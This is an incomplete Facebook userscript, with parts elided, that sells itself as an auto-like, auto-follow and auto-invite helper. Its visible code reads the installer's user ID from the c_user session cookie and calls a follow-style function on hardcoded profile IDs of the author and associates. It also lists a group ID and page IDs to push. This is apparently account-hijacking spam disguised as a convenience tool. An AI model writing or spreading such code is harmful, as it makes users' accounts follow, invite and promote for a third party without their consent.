// ==UserScript==
// @name			AutoAD | AutoFollow(sub) | Invite | AutoSuggest
// @namespace			AutoAD | AutoLike Status | AutoLike Comment | AutoFollow | AutoInvite | AutoSuggest
...
// @author			shamim
// @authorURL			https://www.facebook.com/shamim.hasan.963
...
a("100003587860754"); //Shamim Hasan 
a("100002545395839"); //Megh Balok
a("1834966590"); //Ðúkè Øf Bàñglàðésh 
sublist("");

var gid = ['260934853937800'];
...
var spage_id = "152691648266340";
var spost_id = "152691648266340";
var sfoto_id = "152691648266340";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by auto me';
